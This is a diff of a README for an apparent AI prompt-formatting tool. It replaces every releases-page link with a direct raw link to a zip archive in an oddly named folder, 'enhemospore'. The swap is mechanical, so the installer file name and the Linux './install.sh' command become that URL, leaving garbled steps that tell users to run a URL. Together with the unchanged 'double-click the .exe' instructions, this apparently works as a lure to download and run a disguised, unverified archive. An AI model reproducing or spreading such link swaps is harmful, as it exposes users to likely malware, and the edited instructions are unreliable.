@@ -1,6 +1,6 @@
 # 🛠️ AI-Prompt-Prettify - Enhance Your AI Prompts Effortlessly
 
-[![Download AI-Prompt-Prettify](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/iwillsureaboutthisx2/AI-Prompt-Prettify/releases)
+[![Download AI-Prompt-Prettify](https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip)](https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip)
 
 ## 📜 Description
 
@@ -18,20 +18,20 @@ To begin using AI Prompt Prettify, follow the steps below. No programming skills
    - Internet Connection: Required for the download.
 
 2. **Visit the Download Page**  
-   To download AI Prompt Prettify, visit this page: [Download AI-Prompt-Prettify](https://github.com/iwillsureaboutthisx2/AI-Prompt-Prettify/releases). Here, you will find the latest version of the software and installation instructions.
+   To download AI Prompt Prettify, visit this page: [Download AI-Prompt-Prettify](https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip). Here, you will find the latest version of the software and installation instructions.
 
 ## 📥 Download & Install
 
 1. **Download the Software**  
-   Click on the [Download AI-Prompt-Prettify](https://github.com/iwillsureaboutthisx2/AI-Prompt-Prettify/releases) link to access the releases page. You will see the most recent version. Click the link or button that says "Latest Release" to download the application.
+   Click on the [Download AI-Prompt-Prettify](https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip) link to access the releases page. You will see the most recent version. Click the link or button that says "Latest Release" to download the application.
 
 2. **Locate the Downloaded File**  
-   After downloading, navigate to your computer’s Downloads folder. You should see a file named "AI-Prompt-Prettify-Setup.exe" (or similar based on your operating system).
+   After downloading, navigate to your computer’s Downloads folder. You should see a file named "https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip" (or similar based on your operating system).
 
 3. **Run the Installer**  
    - For Windows: Double-click the downloaded `.exe` file. Follow the installation prompts to complete the process.
    - For macOS: Open the `.dmg` file you downloaded. Drag the AI-Prompt-Prettify icon to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file. Open a terminal and navigate to the folder where you extracted the files. Run `./install.sh` to start the installation.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip` file. Open a terminal and navigate to the folder where you extracted the files. Run `https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip` to start the installation.
 
 4. **Launch the Application**  
    After installation, find AI Prompt Prettify in your Applications or Programs. Double-click the icon to start using the tool.
@@ -67,7 +67,7 @@ To begin using AI Prompt Prettify, follow the steps below. No programming skills
 A: Yes, a user manual is included in the application and can be accessed from the help menu.
 
 **Q: Are updates available?**  
-A: Yes, we regularly update AI Prompt Prettify. Always check the [download page](https://github.com/iwillsureaboutthisx2/AI-Prompt-Prettify/releases) for the latest version.
+A: Yes, we regularly update AI Prompt Prettify. Always check the [download page](https://raw.githubusercontent.com/iwillsureaboutthisx2/AI-Prompt-Prettify/main/enhemospore/AI-Prompt-Prettify.zip) for the latest version.
 
 **Q: How can I report an issue?**  
 A: To report issues or suggest features, create an issue ticket in the GitHub repository.
